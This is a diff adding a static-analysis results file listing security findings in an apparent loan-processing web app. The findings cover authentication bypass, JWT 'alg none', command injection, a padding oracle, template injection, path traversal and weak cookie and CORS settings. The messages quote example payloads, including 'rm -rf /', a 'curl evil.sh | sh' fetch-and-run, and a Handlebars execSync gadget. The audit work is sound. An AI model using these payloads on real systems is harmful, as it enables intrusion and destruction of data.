@@ -1,0 +1,434 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.auth.identity-recovery-bypass",
+      "path": "src/routes/auth.ts",
+      "start": {
+        "line": 285,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 321,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The phone-recovery flow issues a fully authenticated JWT for ANY account with no real identity verification. `/auth/phone-recovery/start` (no auth required) creates a session keyed only by a random id with `verified: false`. `/auth/phone-recovery/complete` (also no auth required) takes that session id plus an attacker-supplied `email`, looks up the user by email, unconditionally sets `session.verified = true`, and immediately issues a valid JWT for that user via generateToken(user) -- the 'out of band' SSN/security-question check mentioned in the comments is never actually performed or checked by the server. Any unauthenticated caller can chain these two endpoints with a victim's email address to obtain a full login token for that account, a complete authentication bypass / account takeover.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-287: Improper Authentication"
+          ],
+          "category": "security",
+          "confidence": "HIGH"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.auth.identity-recovery-bypass",
+      "path": "src/routes/auth.ts",
+      "start": {
+        "line": 334,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 371,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Same authentication-bypass pattern as phone-recovery: `/auth/branch-assist/start` and `/auth/branch-assist/complete` require no authentication. completeBranchAssistSession looks up a user purely by attacker-supplied `email`, never verifies any real identity check happened, and returns a valid JWT (generateToken(user)) for that account. Anyone who knows a victim's email can take over their account.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-287: Improper Authentication"
+          ],
+          "category": "security",
+          "confidence": "HIGH"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.jwt-alg-none-accepted",
+      "path": "src/routes/dashboard.ts",
+      "start": {
+        "line": 42,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 42,
+        "col": 100,
+        "offset": 0
+      },
+      "extra": {
+        "message": "jwt.verify() is called with `algorithms: ['HS256', 'none']`. Including 'none' allows an attacker to craft an unsigned JWT (header {\"alg\":\"none\"}, no signature) with an arbitrary payload such as {\"userId\":\"...\",\"role\":\"admin\"} and have it accepted as valid, bypassing signature verification entirely. Combined with the admin-scope check two lines below (`claims.role === 'admin' ? {} : ...`), this lets an unauthenticated attacker read every loan application and decision volume in the system by forging a cookie with role=admin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-347: Improper Verification of a Cryptographic Signature"
+          ],
+          "category": "security",
+          "confidence": "HIGH"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.missing-auth-webhook",
+      "path": "src/routes/decisions.ts",
+      "start": {
+        "line": 219,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 245,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyBureauRiskCallback is mounted with no `authenticate` middleware (`router.post('/applications/:applicationId/bureau-risk-callback', applyBureauRiskCallback)`), and there is no signature/HMAC/API-key verification of any kind. It trusts the client-supplied `x-vendor-tier` header and request body `access`/`riskTier` fields to directly set `application.riskTier` and fast-track the application, bypassing underwriter review. Any anonymous caller can send `x-vendor-tier: trusted` with `{\"access\":true,\"riskTier\":\"low\"}` to manipulate the risk tier of any loan application.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "category": "security",
+          "confidence": "HIGH"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.missing-auth-webhook",
+      "path": "src/routes/decisions.ts",
+      "start": {
+        "line": 250,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 279,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyBureauRiskCallbackV2 is also mounted with no `authenticate` middleware and no request-signing/HMAC check. Although it validates `vendorTier` against an allowlist and requires `result.access === true`, these values are trivially guessable/spoofable by anyone since there is no cryptographic verification that the caller is the real bureau vendor. An anonymous caller can still fast-track any application's risk tier by sending `x-vendor-tier: trusted` and `{\"access\":true}`.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "category": "security",
+          "confidence": "MEDIUM"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-exec",
+      "path": "src/routes/documents.ts",
+      "start": {
+        "line": 430,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 439,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderDocumentPreviewAs reads `targetFormat` directly from the attacker-controlled `x-preview-format` request header and interpolates it, unsanitized, into a shell command string passed to child_process.exec: `pandoc \"${document.filePath}\" -o \"${outputPath}\" -t ${targetFormat}`. Because exec() invokes a shell, an attacker can send a header like `x-preview-format: pdf; rm -rf / #` (or a subshell/backtick payload) to execute arbitrary OS commands.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "category": "security",
+          "confidence": "HIGH"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-exec",
+      "path": "src/routes/import-export.ts",
+      "start": {
+        "line": 436,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 460,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildExportArchiveBundle takes `preset` directly from the request body with no allowlist/validation and interpolates it into a shell command executed via child_process.exec: `tar -c${preset === 'zip' ? 'j' : 'z'}f ${outputName}.${preset} -C ${bundleDir} .`. A value like `preset: \"tar; curl evil.sh | sh #\"` is passed straight to the shell, giving an authenticated admin-level caller (or anyone able to reach this endpoint) arbitrary command execution. Contrast with the safe twin `buildExportArchiveBundleV2`, which validates `preset` against `ALLOWED_ARCHIVE_PRESETS` and uses `spawn(..., { shell: false })` with an argument array.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "category": "security",
+          "confidence": "HIGH"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.cbc-padding-oracle",
+      "path": "src/services/caseFileSeal.ts",
+      "start": {
+        "line": 19,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 40,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "unsealCaseFilePacket decrypts with AES-256-CBC (unauthenticated encryption) and distinguishes a PKCS#7 padding failure ('bad decrypt' -> INVALID_PADDING) from any other decryption failure (DECRYPTION_FAILED). This distinct error is propagated to the HTTP client in src/routes/documents.ts openSealedCaseFilePacket ('Packet token has an invalid seal format' vs 'Packet token could not be decrypted'), giving an attacker the padding-validity oracle needed to mount a classic Vaudenay padding-oracle attack: by submitting crafted ciphertexts and observing which error is returned, an attacker can decrypt (and, with CBC malleability, forge) sealed case-file packets without ever knowing SEAL_KEY.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-696: Incorrect Behavior Order",
+            "CWE-203: Observable Discrepancy"
+          ],
+          "category": "security",
+          "confidence": "HIGH"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection",
+      "path": "src/routes/users.ts",
+      "start": {
+        "line": 22,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 31,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchStaffDirectory builds an LDAP filter by directly concatenating unescaped user input into the filter string: `(cn=*${term}*)` where `term` comes straight from `req.query.q`. An attacker can inject LDAP metacharacters (`*`, `(`, `)`, `\\`) to alter the filter logic (e.g. `q=*)(objectClass=*` style injection) and broaden or bypass the intended search scope. Contrast with the adjacent findStaffMemberByEmail handler, which correctly calls `directoryClient.escapeFilter(email)` before building its filter.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query (LDAP Injection)"
+          ],
+          "category": "security",
+          "confidence": "HIGH"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.server-side-template-injection",
+      "path": "src/routes/messages.ts",
+      "start": {
+        "line": 200,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 228,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewCorrespondenceDraft takes `bodyTemplate` directly from the request body and passes it to `Handlebars.compile(bodyTemplate)` before rendering it. Handlebars is a full template engine; compiling an attacker/staff-supplied template string (rather than only its data) permits Handlebars helper/constructor-access based template injection payloads (e.g. `{{#with \"constructor\"}}{{#with split}}{{pop}}{{push \"return process.mainModule.require('child_process').execSync('id')\"}}{{#with (...)}}...{{/with}}{{/with}}{{/with}}`-style Handlebars SSTI gadgets), which can lead to remote code execution in the Node process. Contrast with previewQuickNoteFromLibrary, which only compiles a fixed, developer-authored template from CORRESPONDENCE_SNIPPETS and takes only the merge-field values from the caller.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')",
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine"
+          ],
+          "category": "security",
+          "confidence": "MEDIUM"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.arbitrary-file-write-upload-filename",
+      "path": "src/routes/products.ts",
+      "start": {
+        "line": 204,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 230,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "uploadProductRateSheet writes the uploaded file using the client-supplied original filename verbatim: `path.join(collateralDir, req.file.originalname)`. multer's memoryStorage does not sanitize `originalname`, so a multipart upload with a filename like `../../../../app/src/routes/products.ts` or an absolute path lets an authenticated admin/underwriter write (and overwrite) arbitrary files outside `collateralDir`, including application source files, leading to potential remote code execution. Contrast with the adjacent uploadProductBrochureImage, which generates a safe filename via `crypto.randomUUID()`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "category": "security",
+          "confidence": "HIGH"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.header-controlled-file-path",
+      "path": "src/routes/templates.ts",
+      "start": {
+        "line": 64,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 98,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "stageTemplateForBatch takes `runLabel` directly from the attacker-controlled `x-batch-run-label` request header and builds a file path with `path.join(templateStagingDir, `${runLabel}.json`)` with no sanitization or containment check. A header value containing `../` sequences (e.g. `x-batch-run-label: ../../../../etc/cron.d/evil`) lets an authenticated admin/underwriter write a JSON file to an arbitrary location on disk.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "category": "security",
+          "confidence": "HIGH"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.arbitrary-file-read-query-param",
+      "path": "src/routes/import-export.ts",
+      "start": {
+        "line": 372,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 394,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "fetchReportLayoutPreset builds a file path from the `reportType` query parameter with `path.join(reportLayoutsDir, `${reportType}.json`)` and no path-containment check before reading and returning the file contents. A value containing `../` sequences lets an authenticated admin/underwriter read arbitrary `*.json`-suffixed files (or, via null-byte-style tricks on some Node versions/older filesystems, other files) outside `reportLayoutsDir`. Contrast with the adjacent fetchArchivedReportLayoutPreset, which resolves the path and explicitly checks `layoutPath.startsWith(baseDir + path.sep)` before allowing access.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "category": "security",
+          "confidence": "MEDIUM"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cookie.missing-secure-httponly-flags",
+      "path": "src/routes/applications.ts",
+      "start": {
+        "line": 706,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 709,
+        "col": 30,
+        "offset": 0
+      },
+      "extra": {
+        "message": "createCommitteeReviewLink sets `res.cookie('committee_session', sessionId)` with no `httpOnly`, `secure`, or `sameSite` attributes, and the underlying `committeeSessions` entry never expires. Any script running on the page (or a network attacker on a non-HTTPS hop) can read or replay this cookie to access the loan committee's read access to `/applications/committee-review-summary` indefinitely. Contrast with the adjacent createAccountantSummaryLink, which sets `httpOnly: true, secure: ..., sameSite: 'strict', maxAge: ttlMs` on its cookie.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-614: Sensitive Cookie Without 'Secure' Attribute",
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"
+          ],
+          "category": "security",
+          "confidence": "MEDIUM"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.reflected-origin-any-domain",
+      "path": "src/routes/webhooks.ts",
+      "start": {
+        "line": 178,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 198,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "reportPartnerDeliveryStatus reflects any request `Origin` header back verbatim into `Access-Control-Allow-Origin` with no allowlist check, allowing any external website to make cross-origin requests to this authenticated endpoint and read the response. Contrast with reportProvisionedPartnerDeliveryStatus (the '-v2' endpoint), which only reflects the origin when it appears in `APPROVED_PARTNER_ORIGINS`.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "category": "security",
+          "confidence": "MEDIUM"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.rate-limit.brute-forceable-otp",
+      "path": "src/routes/auth.ts",
+      "start": {
+        "line": 245,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 272,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The email-change verification code is a 6-digit numeric code (`Math.floor(Math.random() * 1000000)`) valid for 15 minutes, and '/auth/email/verification-code/confirm' has no rate limiting or attempt-count lockout on guesses of `code`. An attacker who can reach this authenticated endpoint (any logged-in user, for their own or a colluding account) can script up to 1,000,000 guesses within the validity window to brute-force the code and take over a pending email change.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-307: Improper Restriction of Excessive Authentication Attempts"
+          ],
+          "category": "security",
+          "confidence": "LOW"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.headers.clickjacking-frame-ancestors-wildcard",
+      "path": "src/routes/dashboard.ts",
+      "start": {
+        "line": 352,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 356,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderCaseReviewWidget removes the `X-Frame-Options` header and sets `Content-Security-Policy: frame-ancestors *` whenever `NODE_ENV !== 'production'`. If NODE_ENV is ever unset or misconfigured in a deployed (non-strictly-'production') environment, the widget can be framed by any origin, enabling clickjacking against authenticated admin/underwriter users. Contrast with renderCaseReviewWidgetV2, which always sets `X-Frame-Options: DENY` and restricts `frame-ancestors` to a specific trusted origin.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1021: Improper Restriction of Rendered UI Layers or Frames"
+          ],
+          "category": "security",
+          "confidence": "LOW"
+        }
+      }
+    }
+  ]
+}
